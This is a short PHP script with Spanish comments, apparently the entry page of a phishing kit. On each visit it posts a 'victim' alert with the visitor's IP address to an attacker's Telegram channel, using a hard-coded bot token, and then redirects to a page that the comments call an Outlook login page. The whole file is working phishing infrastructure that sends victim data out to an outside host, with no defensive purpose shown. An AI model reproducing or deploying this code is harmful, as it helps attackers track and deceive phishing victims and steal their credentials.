<?php

// Tus credenciales del bot de Telegram
$token = '6661415271:AAHUY_ATjKVIsEfjt0rlsbwkNyTL6AjovW8';

// ID del canal de Telegram al que deseas enviar el mensaje
$channelId = -1002073975829; // Reemplaza esto con el ID de tu canal

// URL de la API de Telegram para enviar mensajes
$sendMessageUrl = "https://api.telegram.org/bot$token/sendMessage";

// Mensaje que deseas enviar
$message = "INGRESO UNA VICTIMA IP: " . $_SERVER['REMOTE_ADDR'];

// Datos a enviar
$data = [
    'chat_id' => $channelId,
    'text' => $message,
];

// Inicializar la sesión cURL
$ch = curl_init($sendMessageUrl);

// Configurar las opciones de la solicitud cURL
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

// Ejecutar la solicitud cURL y obtener la respuesta
$response = curl_exec($ch);

// Cerrar la sesión cURL
curl_close($ch);



// Redireccionar a la página de inicio de sesión de Outlook
header('Location: compra.html');

exit;

?>